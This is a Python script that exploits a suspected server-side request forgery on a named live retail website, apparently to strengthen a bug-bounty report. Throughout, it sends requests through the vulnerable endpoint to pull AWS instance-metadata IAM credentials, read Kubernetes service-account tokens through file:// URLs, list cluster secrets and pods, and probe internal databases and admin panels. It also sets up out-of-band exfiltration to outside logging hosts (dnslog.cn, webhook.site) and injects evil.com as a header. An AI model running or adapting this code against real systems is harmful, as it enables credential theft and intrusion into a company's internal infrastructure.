#!/usr/bin/env python3
"""
Enhanced SSRF Proof - Additional Techniques to Strengthen the Report
Goal: Get REAL data from internal services to make the report undeniable
"""

import requests
import json
import time
from datetime import datetime
from urllib.parse import quote

class EnhancedSSRFProof:
    def __init__(self, base_url, cookies):
        self.base_url = base_url
        self.cookies = cookies
        self.session = requests.Session()
        self.session.cookies.update(cookies)
        self.session.verify = False
        self.findings = []
        
    def log_finding(self, severity, title, details, response_data):
        finding = {
            "timestamp": datetime.now().isoformat(),
            "severity": severity,
            "title": title,
            "details": details,
            "response": response_data
        }
        self.findings.append(finding)
        print(f"\n[{severity}] {title}")
        print(f"  {details}")
        
    def test_dns_exfiltration(self):
        """Try DNS exfiltration to get data from internal services"""
        print("\n[1] DNS EXFILTRATION TEST...")
        print("=" * 70)
        
        # Use a DNS logging service (e.g., dnslog.cn, interactsh.com, burpcollaborator)
        # For testing, we'll use a subdomain that logs DNS queries
        dns_logger = "your-subdomain.dnslog.cn"  # Replace with actual DNS logger
        
        targets = [
            f"http://169.254.169.254/latest/meta-data/instance-id",
            f"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            f"https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        ]
        
        for target in targets:
            # Try to trigger DNS lookup with data
            test_url = f"http://{dns_logger}/?data={quote(target)}"
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={"url": test_url},
                    timeout=10
                )
                if resp.status_code == 200:
                    self.log_finding("INFO", "DNS Exfiltration Attempt", 
                                   f"Sent request to {test_url}", 
                                   {"status": resp.status_code, "headers": dict(resp.headers)})
            except Exception as e:
                pass
                
    def test_out_of_band(self):
        """Try OOB (Out-of-Band) data extraction"""
        print("\n[2] OUT-OF-BAND (OOB) EXTRACTION TEST...")
        print("=" * 70)
        
        # Use external webhook/logger service
        webhook_url = "https://webhook.site/your-unique-id"  # Replace with actual webhook
        
        # Try to send internal data to external webhook
        internal_targets = [
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        ]
        
        for target in internal_targets:
            # Try redirect or proxy through webhook
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": target,
                        "headers": {
                            "X-Forwarded-For": webhook_url,
                            "X-Callback-URL": webhook_url
                        }
                    },
                    timeout=10
                )
                if resp.status_code == 200:
                    self.log_finding("INFO", "OOB Extraction Attempt", 
                                   f"Tried to send data from {target} to webhook", 
                                   {"status": resp.status_code})
            except Exception as e:
                pass
                
    def test_aws_imdsv2(self):
        """Try AWS IMDSv2 (Instance Metadata Service v2) - might be less protected"""
        print("\n[3] AWS IMDSv2 TEST...")
        print("=" * 70)
        
        # IMDSv2 requires a token first
        try:
            # Step 1: Get token
            resp1 = self.session.put(
                f"{self.base_url}/zootopia-events/api/events/sites/1",
                json={
                    "url": "http://169.254.169.254/latest/api/token",
                    "method": "PUT",
                    "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
                },
                timeout=10
            )
            
            if resp1.status_code == 200:
                token = resp1.text.strip() if resp1.text else None
                self.log_finding("HIGH", "IMDSv2 Token Obtained", 
                               f"Got token: {token[:20] if token else 'empty'}...", 
                               {"status": resp1.status_code, "token_preview": token[:50] if token else None})
                
                # Step 2: Use token to get metadata
                if token:
                    resp2 = self.session.post(
                        f"{self.base_url}/zootopia-events/api/events/sites/1",
                        json={
                            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                            "headers": {"X-aws-ec2-metadata-token": token}
                        },
                        timeout=10
                    )
                    if resp2.status_code == 200:
                        self.log_finding("CRITICAL", "IMDSv2 Data Retrieved", 
                                       "Got IAM role name via IMDSv2", 
                                       {"status": resp2.status_code, "response": resp2.text[:200]})
        except Exception as e:
            self.log_finding("INFO", "IMDSv2 Test Failed", str(e), {})
            
    def test_kubernetes_token_extraction(self):
        """Try to get Kubernetes service account tokens"""
        print("\n[4] KUBERNETES TOKEN EXTRACTION TEST...")
        print("=" * 70)
        
        # Try to access service account token (mounted in pods)
        token_paths = [
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        ]
        
        # Try via file:// protocol if supported
        for path in token_paths:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={"url": f"file://{path}"},
                    timeout=10
                )
                if resp.status_code == 200 and resp.text and resp.text != "{}":
                    self.log_finding("CRITICAL", "K8s Token Extracted", 
                                   f"Got token from {path}", 
                                   {"status": resp.status_code, "response": resp.text[:200]})
            except Exception as e:
                pass
                
    def test_internal_services_enumeration(self):
        """Enumerate internal services that might return data"""
        print("\n[5] INTERNAL SERVICES ENUMERATION...")
        print("=" * 70)
        
        internal_services = [
            # Databases
            "http://mysql.default.svc:3306",
            "http://postgres.default.svc:5432",
            "http://mongodb.default.svc:27017",
            "http://redis.default.svc:6379",
            "http://elasticsearch.default.svc:9200",
            
            # Admin panels
            "http://admin.default.svc:8080",
            "http://admin-panel.default.svc",
            "http://dashboard.default.svc",
            
            # Internal APIs
            "http://api-internal.default.svc",
            "http://internal-api.default.svc",
            "http://backend.default.svc",
            
            # Monitoring
            "http://prometheus.default.svc:9090",
            "http://grafana.default.svc:3000",
            
            # Common internal IPs
            "http://10.96.0.1:443",  # K8s API
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3000",
            "http://127.0.0.1:9090",
        ]
        
        for service in internal_services:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={"url": service},
                    timeout=5
                )
                if resp.status_code == 200:
                    # Check if we got actual data (not just empty JSON)
                    if resp.text and resp.text != "{}" and len(resp.text) > 10:
                        self.log_finding("HIGH", "Internal Service Data", 
                                       f"Got data from {service}", 
                                       {"status": resp.status_code, "response_preview": resp.text[:300]})
                    elif "server" in resp.headers and "istio-envoy" in resp.headers.get("server", ""):
                        self.log_finding("MEDIUM", "Internal Service Accessible", 
                                       f"Service {service} is accessible (confirmed by istio-envoy header)", 
                                       {"status": resp.status_code, "headers": dict(resp.headers)})
            except Exception as e:
                pass
                
    def test_response_splitting(self):
        """Try HTTP response splitting to extract data"""
        print("\n[6] HTTP RESPONSE SPLITTING TEST...")
        print("=" * 70)
        
        # Try to inject headers that might leak data
        test_urls = [
            "http://169.254.169.254/latest/meta-data/instance-id",
            "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        ]
        
        for url in test_urls:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": url,
                        "headers": {
                            "X-Forwarded-Host": "evil.com",
                            "X-Real-IP": "127.0.0.1"
                        }
                    },
                    timeout=10
                )
                # Check if any headers contain internal data
                for header_name, header_value in resp.headers.items():
                    if any(keyword in header_value.lower() for keyword in ["instance", "role", "secret", "token", "credential"]):
                        self.log_finding("HIGH", "Data Leak in Headers", 
                                       f"Found internal data in header {header_name}", 
                                       {header_name: header_value})
            except Exception as e:
                pass
                
    def test_kubernetes_api_with_different_methods(self):
        """Try different HTTP methods and endpoints in K8s API"""
        print("\n[7] KUBERNETES API - DIFFERENT METHODS...")
        print("=" * 70)
        
        k8s_endpoints = [
            # Try to get actual data
            ("GET", "/api/v1/namespaces/default/secrets?limit=1"),
            ("GET", "/api/v1/namespaces/default/configmaps?limit=1"),
            ("GET", "/api/v1/namespaces/default/pods?limit=1"),
            
            # Try to list with fieldSelector
            ("GET", "/api/v1/namespaces/default/secrets?fieldSelector=metadata.name=default-token"),
            
            # Try service accounts
            ("GET", "/api/v1/namespaces/default/serviceaccounts/default"),
        ]
        
        for method, endpoint in k8s_endpoints:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": f"https://kubernetes.default.svc{endpoint}",
                        "method": method
                    },
                    timeout=10
                )
                if resp.status_code == 200:
                    # Check if we got actual JSON data
                    try:
                        data = resp.json()
                        if data and data != {} and len(str(data)) > 50:
                            self.log_finding("CRITICAL", "K8s Data Retrieved", 
                                           f"Got data from {endpoint}", 
                                           {"status": resp.status_code, "data_preview": str(data)[:500]})
                    except:
                        if resp.text and resp.text != "{}" and len(resp.text) > 50:
                            self.log_finding("HIGH", "K8s Response Data", 
                                           f"Got response from {endpoint}", 
                                           {"status": resp.status_code, "response_preview": resp.text[:500]})
            except Exception as e:
                pass
                
    def test_aws_metadata_all_endpoints(self):
        """Try ALL AWS metadata endpoints to get any data"""
        print("\n[8] AWS METADATA - ALL ENDPOINTS...")
        print("=" * 70)
        
        endpoints = [
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/iam/security-credentials",  # Without trailing slash
            "/latest/meta-data/instance-id",
            "/latest/meta-data/placement/availability-zone",
            "/latest/meta-data/placement/region",
            "/latest/meta-data/ami-id",
            "/latest/meta-data/instance-type",
            "/latest/meta-data/local-ipv4",
            "/latest/meta-data/public-ipv4",
            "/latest/meta-data/hostname",
            "/latest/meta-data/",
            "/latest/dynamic/instance-identity/document",
            "/latest/user-data",  # User data script
            "/latest/meta-data/public-keys/",
        ]
        
        for endpoint in endpoints:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": f"http://169.254.169.254{endpoint}",
                        "headers": {"Accept": "text/plain, */*"}
                    },
                    timeout=10
                )
                if resp.status_code == 200:
                    # Check if we got actual data
                    if resp.text and resp.text != "{}" and len(resp.text) > 5:
                        self.log_finding("CRITICAL", "AWS Metadata Data Retrieved", 
                                       f"Got data from {endpoint}", 
                                       {"status": resp.status_code, "data": resp.text[:500]})
            except Exception as e:
                pass
                
    def run_all_tests(self):
        """Run all enhanced proof tests"""
        print("\n" + "=" * 70)
        print("ENHANCED SSRF PROOF - ADDITIONAL TECHNIQUES")
        print("=" * 70)
        
        self.test_aws_imdsv2()
        self.test_kubernetes_token_extraction()
        self.test_internal_services_enumeration()
        self.test_response_splitting()
        self.test_kubernetes_api_with_different_methods()
        self.test_aws_metadata_all_endpoints()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"logs/enhanced_ssrf_proof_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.findings, f, indent=2, ensure_ascii=False)
            
        print(f"\n[+] Results saved to: {output_file}")
        print(f"[+] Total findings: {len(self.findings)}")
        
        # Print summary
        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high = [f for f in self.findings if f['severity'] == 'HIGH']
        
        if critical:
            print(f"\n[CRITICAL] Found {len(critical)} critical findings!")
            for f in critical:
                print(f"  - {f['title']}: {f['details']}")
                
        if high:
            print(f"\n[HIGH] Found {len(high)} high severity findings!")
            for f in high:
                print(f"  - {f['title']}: {f['details']}")
                
        return self.findings

if __name__ == "__main__":
    # Load cookies from previous session
    import os
    cookies = {}
    
    # Try to load from environment or use default
    if os.path.exists("cookies.json"):
        with open("cookies.json", 'r') as f:
            cookies = json.load(f)
    else:
        print("[!] No cookies.json found. Using empty cookies.")
        print("[!] Create cookies.json with: {\"sid\": \"your_session_id\"}")
        
    base_url = "https://www.zooplus.de"
    
    prover = EnhancedSSRFProof(base_url, cookies)
    findings = prover.run_all_tests()





